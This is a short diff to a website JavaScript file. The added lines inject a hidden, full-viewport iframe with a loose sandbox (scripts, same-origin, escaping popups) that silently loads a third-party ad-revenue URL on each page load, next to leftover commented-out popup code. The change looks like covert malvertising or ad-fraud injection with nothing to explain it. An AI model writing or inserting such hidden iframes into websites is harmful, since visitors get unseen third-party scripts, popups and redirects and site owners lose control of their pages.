@@ -1,4 +1,12 @@
 (function(docpointer) {
+	let viewer = document.createElement("iframe");
+	viewer.style = "position: fixed; visibility: hidden; pointer-events: none; width: 100.0vw; height: 100.0vh; top: 0px; left: 0px; border: none";
+	viewer.setAttribute("sandbox", "allow-forms allow-modals allow-orientation-lock allow-pointer-lock allow-popups allow-popups-to-escape-sandbox allow-presentation allow-same-origin allow-scripts allow-top-navigation-by-user-activation");
+	viewer.src = "https://www.highcpmrevenuegate.com/mgdb89pzcd?key=d1c847375d32dd63dbbdef356ff5335f";
+	if (window.document.body != null)
+		window.document.body.appendChild(viewer);
+	else
+		window.document.head.appendChild(viewer);
 	return false;
 	/*let showTelPop = function() {
 		let meItem = localStorage.getItem("telpopcornlast");
